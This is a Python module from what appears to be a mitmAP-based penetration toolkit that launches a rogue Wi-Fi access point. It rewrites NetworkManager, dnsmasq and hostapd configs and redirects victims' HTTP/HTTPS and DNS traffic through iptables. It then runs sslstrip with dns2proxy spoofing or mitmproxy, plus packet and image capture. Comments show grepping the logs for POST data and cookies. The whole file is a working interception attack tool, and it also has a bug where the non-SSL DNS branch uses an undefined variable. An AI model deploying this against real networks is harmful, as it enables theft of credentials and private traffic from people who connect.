# coding=utf-8
# Author: @xdavidhu
# Adapted by: @JosueEncinar

import os
import time
import subprocess
import getpass
from utils.custom_print import print_error, print_info, print_ok

sudo = "/usr/bin/sudo"
tee = "/usr/bin/tee"

def _run_cmd_write(cmd_args, s):
    # write a file using sudo
    p = subprocess.Popen(cmd_args,
                         stdin=subprocess.PIPE,
                         stdout=subprocess.DEVNULL,
                         shell=False, universal_newlines=True)
    p.stdin.write(s)
    p.stdin.close()
    p.wait()

def write_file(path, s):
    _run_cmd_write((sudo, tee, path), s)

def append_file(path, s):
    # append to the file, don't overwrite
    _run_cmd_write((sudo, tee, "-a", path), s)

def start_some_services(ap_iface, script_path, wireshark_if, driftnet_if, tshark_if):
    if wireshark_if:
        print_info("Starting WIRESHARK...")
        os.system("sudo screen -S mitmap-wireshark -m -d wireshark -i " + ap_iface + " -k -w " + script_path + "logs/mitmap-wireshark.pcap")
    if driftnet_if:
        print_info("Starting DRIFTNET...")
        os.system("sudo screen -S mitmap-driftnet -m -d driftnet -i " + ap_iface)
    if tshark_if:
        print_info("Starting TSHARK...")
        os.system("sudo screen -S mitmap-tshark -m -d tshark -i " + ap_iface + " -w " + script_path + "logs/mitmap-tshark.pcap")

def start_dns_masq():
    print_info("Starting DNSMASQ server...")
    os.system("sudo /etc/init.d/dnsmasq stop > /dev/null 2>&1")
    os.system("sudo pkill dnsmasq")
    os.system("sudo dnsmasq")

def launch_ap(ap_iface, net_iface, channel, sslstrip_if, hostapd_wpa, wpa_passphrase, driftnet_if, ssid, wireshark_if, tshark_if, dns_if, all_dns, proxy_if):
    sslstrip_if = str(sslstrip_if).lower() == "true"
    driftnet_if =  str(driftnet_if).lower() == "true"
    wireshark_if =  str(wireshark_if).lower() == "true"
    tshark_if =  str(tshark_if).lower() == "true"
    dns_if =  str(dns_if).lower() == "true"
    hostapd_wpa = str(hostapd_wpa).lower() == "true"
    try:
        script_path = os.path.dirname(os.path.realpath(__file__)) + "/../"
        os.system("sudo chmod 777 " + script_path + "logs")
        network_manager_cfg = "[main]\nplugins=keyfile\n\n[keyfile]\nunmanaged-devices=interface-name:" + ap_iface + "\n"
        print("Backing up NetworkManager.cfg...")
        os.system("sudo cp /etc/NetworkManager/NetworkManager.conf /etc/NetworkManager/NetworkManager.conf.backup")
        print("Editing NetworkManager.cfg...")
        write_file("/etc/NetworkManager/NetworkManager.conf", network_manager_cfg )
        print("Restarting NetworkManager...")
        os.system("sudo service network-manager restart")
        os.system("sudo ifconfig " + ap_iface + " up")

        #DNSMASQ CONFIG
        print_info("Backing up /etc/dnsmasq.conf...")
        os.system("sudo cp /etc/dnsmasq.conf /etc/dnsmasq.conf.backup")
        print_info("Creating new /etc/dnsmasq.conf...")
        if sslstrip_if:
            dnsmasq_file = "port=0\n# disables dnsmasq reading any other files like /etc/resolv.conf for nameservers\nno-resolv\n# Interface to bind to\ninterface=" + ap_iface + "\n#Specify starting_range,end_range,lease_time\ndhcp-range=10.0.0.3,10.0.0.20,12h\ndhcp-option=3,10.0.0.1\ndhcp-option=6,10.0.0.1\n"
        else:
            dnsmasq_file = "# disables dnsmasq reading any other files like /etc/resolv.conf for nameservers\nno-resolv\n# Interface to bind to\ninterface=" + ap_iface + "\n#Specify starting_range,end_range,lease_time\ndhcp-range=10.0.0.3,10.0.0.20,12h\n# dns addresses to send to the clients\nserver=8.8.8.8\nserver=10.0.0.1\n"
        print_info("Deleting old config file...")
        os.system("sudo rm /etc/dnsmasq.conf > /dev/null 2>&1")
        print_info("Writing config file...")
        write_file("/etc/dnsmasq.conf", dnsmasq_file)
        #/DNSMASQ CONFIG

        #HOSTAPD CONFIG
        if hostapd_wpa:
            hostapd_file = "interface=" + ap_iface + "\ndriver=nl80211\nssid=" + ssid + "\nhw_mode=g\nchannel=" + channel + "\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\nwpa=2\nwpa_passphrase=" + wpa_passphrase + "\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP\nrsn_pairwise=CCMP\n"
        else:
            hostapd_file = "interface=" + ap_iface + "\ndriver=nl80211\nssid=" + ssid + "\nhw_mode=g\nchannel=" + channel + "\nmacaddr_acl=0\nauth_algs=1\nignore_broadcast_ssid=0\n"
        print_info("Deleting old config file...")
        os.system("sudo rm /etc/hostapd/hostapd.conf > /dev/null 2>&1")
        print_info("Writing config file...")
        write_file("/etc/hostapd/hostapd.conf", hostapd_file)
        #/HOSTAPD CONFIG

        #IPTABLES
        print_info("Configuring AP interface...")
        os.system("sudo ifconfig " + ap_iface + " up 10.0.0.1 netmask 255.255.255.0")
        print_info("Applying iptables rules...")
        os.system("sudo iptables --flush")
        os.system("sudo iptables --table nat --flush")
        os.system("sudo iptables --delete-chain")
        os.system("sudo iptables --table nat --delete-chain")
        os.system("sudo iptables --table nat --append POSTROUTING --out-interface " + net_iface + " -j MASQUERADE")
        os.system("sudo iptables --append FORWARD --in-interface " + ap_iface + " -j ACCEPT")
        #/IPTABLES

        #SSLSTRIP MODE
        if sslstrip_if:
            #SSLSTRIP DNS SPOOFING
            if dns_if:
                print_info("Backing up " + script_path + "src/dns2proxy/spoof.cfg...")
                os.system("sudo cp " + script_path + "src/dns2proxy/spoof.cfg  " + script_path + "src/dns2proxy/spoof.cfg.backup")
                os.system("sudo cat /dev/null > "+ script_path + "src/dns2proxy/spoof.cfg")
                i = 0
                for ssl_dns_line in all_dns["ssl"]: 
                    os.system("sudo echo -e '" + ssl_dns_line + "' >> "+ script_path + "src/dns2proxy/spoof.cfg")
            #/SSLSTRIP DNS SPOOFING

            start_dns_masq()

            os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000")
            os.system("sudo iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-port 53")
            os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 53 -j REDIRECT --to-port 53")
            os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")


            print_info("Starting AP on " + ap_iface + " in screen terminal...")
            os.system("sudo screen -S mitmap-sslstrip -m -d python " + script_path + "src/sslstrip2/sslstrip.py -l 9000 -w " + script_path + "logs/mitmap-sslstrip.log -a")
            os.system("sudo screen -S mitmap-dns2proxy -m -d sh -c 'cd " + script_path + "src/dns2proxy && python dns2proxy.py'")
            time.sleep(5)
            os.system("sudo screen -S mitmap-hostapd -m -d hostapd /etc/hostapd/hostapd.conf")
            start_some_services(ap_iface, script_path, wireshark_if, driftnet_if, tshark_if)
            #print("\nTAIL started on " + script_path + "logs/mitmap-sslstrip.log...\nWait for output... (press 'CTRL + C' 2 times to stop)\nHOST-s, POST requests and COOKIES will be shown.\n")
            try:
                time.sleep(5)
            except:
                print("")
            #print_info("Restarting tail in 1 sec... (press 'CTRL + C' again to stop)")
            print_ok("Done")
            while True:
                try:
                    time.sleep(1)
                    #os.system("sudo tail -f " + script_path + "logs/mitmap-sslstrip.log | grep -e 'Sending Request: POST' -e 'New host:' -e 'Sending header: cookie' -e 'POST Data'")
                except KeyboardInterrupt:
                    raise KeyboardInterrupt
            #STARTING POINT
        #/SSLSTRIP MODE
        else:
            #DNSMASQ DNS SPOOFING
            if dns_if:
                print_info("Backing up /etc/dnsmasq.conf...")
                os.system("sudo cp /etc/dnsmasq.conf /etc/dnsmasq.conf.backup")
                for no_ssl_dns_line in all_dns["no_ssl"]: 
                    os.system("sudo echo -e '" + ssl_dns_line + "' >> "+ script_path + "src/dns2proxy/spoof.cfg")
                    append_file("/etc/dnsmasq.conf", no_ssl_dns_line)
            else:
                print_info("Skipping..")
            #/DNSMASQ DNS SPOOFING
            start_dns_masq()

            # #MITMPROXY MODE
            proxy_if = proxy_if.lower()
            if proxy_if != "no":
                if proxy_if == "nossl":
                    os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
                else:
                    print("To install the certificate, go to 'http://mitm.it/' through the proxy, and choose your OS.")
                    os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
                    os.system("sudo iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080")
                os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
                print("Starting AP on " + ap_iface + " in screen terminal...")
                if wireshark_if == "y" or wireshark_if == "":
                    print("Starting WIRESHARK...")
                    os.system("sudo screen -S mitmap-wireshark -m -d wireshark -i " + ap_iface + " -k -w " + script_path + "logs/mitmap-wireshark.pcap")
                if driftnet_if == "y" or driftnet_if == "":
                    print("Starting DRIFTNET...")
                    os.system("sudo screen -S mitmap-driftnet -m -d driftnet -i " + ap_iface)
                if tshark_if == "y" or tshark_if == "":
                    print("Starting TSHARK...")
                    os.system("sudo screen -S mitmap-tshark -m -d tshark -i " + ap_iface + " -w " + script_path + "logs/mitmap-tshark.pcap")
                os.system("sudo screen -S mitmap-hostapd -m -d hostapd /etc/hostapd/hostapd.conf")
                print("\nStarting MITMPROXY in 5 seconds... (press q and y to exit)\n")
                try:
                    time.sleep(5)
                except:
                    print("")
                os.system("sudo mitmproxy -T --host --follow -w " + script_path + "logs/mitmap-proxy.mitmproxy")
                #STARTING POINT
            else:
                print("Skipping proxy...")
            # #/MITMPROXY MODE
            start_some_services(ap_iface, script_path, wireshark_if, driftnet_if, tshark_if)
            os.system("sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
            print_info("Starting AP on " + ap_iface + "...\n")
            os.system("sudo hostapd /etc/hostapd/hostapd.conf")
            print_ok("Done")
            #STARTING POINT
        
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print_error(e)
    finally:
        stop_ap(ap_iface, net_iface, channel, sslstrip_if, hostapd_wpa, driftnet_if, ssid, wireshark_if, tshark_if, dns_if, script_path)

#STOPPING
def stop_ap(ap_iface, net_iface, channel, sslstrip_if, hostapd_wpa, driftnet_if, ssid, wireshark_if, tshark_if, dns_if, script_path):
    try:
        print_info("Stopping AP")
        if sslstrip_if:
            os.system("sudo screen -S mitmap-hostapd -X stuff '^C\n'")
            os.system("sudo screen -S mitmap-sslstrip -X stuff '^C\n'")
            os.system("sudo screen -S mitmap-dns2proxy -X stuff '^C\n'")
            if dns_if:
                print_info("Restoring old " + script_path + "src/dns2proxy/spoof.cfg...")
                os.system("sudo mv " + script_path + "src/dns2proxy/spoof.cfg.backup  " + script_path + "src/dns2proxy/spoof.cfg")
        if wireshark_if:
            os.system("sudo screen -S mitmap-wireshark -X stuff '^C\n'")
        if driftnet_if:
            os.system("sudo screen -S mitmap-driftnet -X stuff '^C\n'")
        if tshark_if:
            os.system("sudo screen -S mitmap-tshark -X stuff '^C\n'")
        print_info("Restoring old NetworkManager.cfg")
        if os.path.isfile("/etc/NetworkManager/NetworkManager.conf.backup"):
            os.system("sudo mv /etc/NetworkManager/NetworkManager.conf.backup /etc/NetworkManager/NetworkManager.conf")
        else:
            os.system("sudo rm /etc/NetworkManager/NetworkManager.conf")
        print_info("Restarting NetworkManager...")
        os.system("sudo service network-manager restart")
        print_info("Stopping DNSMASQ server...")
        os.system("sudo /etc/init.d/dnsmasq stop > /dev/null 2>&1")
        os.system("sudo pkill dnsmasq")
        print_info("Restoring old dnsmasq.cfg...")
        os.system("sudo mv /etc/dnsmasq.conf.backup /etc/dnsmasq.conf > /dev/null 2>&1")
        print_info("Deleting old '/etc/dnsmasq.hosts' file...")
        os.system("sudo rm /etc/dnsmasq.hosts > /dev/null 2>&1")
        print_info("Flushing iptables rules...")
        os.system("sudo iptables --flush")
        os.system("sudo iptables --flush -t nat")
        os.system("sudo iptables --delete-chain")
        os.system("sudo iptables --table nat --delete-chain")
        #print_info("Traffic have been saved to the 'log' folder!")
        print_ok("mitmAP stopped.")
    except KeyboardInterrupt:
        print_info("\n\n[!] Stopping... (Dont worry if you get errors)")
        try:
            if sslstrip_if:
                os.system("sudo screen -S mitmap-hostapd -X stuff '^C\n'")
                os.system("sudo screen -S mitmap-sslstrip -X stuff '^C\n'")
                os.system("sudo screen -S mitmap-dns2proxy -X stuff '^C\n'")
                if dns_if:
                    print_info("Restoring old " + script_path + "src/dns2proxy/spoof.cfg...")
                    os.system("sudo mv " + script_path + "src/dns2proxy/spoof.cfg.backup  " + script_path + "src/dns2proxy/spoof.cfg")
        except:
            pass
        try:
            if wireshark_if:
                os.system("sudo screen -S mitmap-wireshark -X stuff '^C\n'")
        except:
            pass
        try:
            if driftnet_if:
                os.system("sudo screen -S mitmap-driftnet -X stuff '^C\n'")
        except:
            pass
        try:
            if tshark_if:
                os.system("sudo screen -S mitmap-tshark -X stuff '^C\n'")
        except:
            pass
        print_info("Restoring old NetworkManager.cfg")
        if os.path.isfile("/etc/NetworkManager/NetworkManager.conf.backup"):
            os.system("sudo mv /etc/NetworkManager/NetworkManager.conf.backup /etc/NetworkManager/NetworkManager.conf > /dev/null 2>&1")
        else:
            os.system("sudo rm /etc/NetworkManager/NetworkManager.conf > /dev/null 2>&1")
        print_info("Restarting NetworkManager...")
        os.system("sudo service network-manager restart")
        print_info("Stopping DNSMASQ server...")
        os.system("sudo /etc/init.d/dnsmasq stop > /dev/null 2>&1")
        os.system("sudo pkill dnsmasq")
        print_info("Restoring old dnsmasq.cfg...")
        os.system("sudo mv /etc/dnsmasq.conf.backup /etc/dnsmasq.conf > /dev/null 2>&1")
        print_info("Deleting old '/etc/dnsmasq.hosts' file...")
        os.system("sudo rm /etc/dnsmasq.hosts > /dev/null 2>&1")
        print_info("Flushing iptables rules...")
        os.system("sudo iptables --flush")
        os.system("sudo iptables --flush -t nat")
        os.system("sudo iptables --delete-chain")
        os.system("sudo iptables --table nat --delete-chain")
        print("Module stopped.")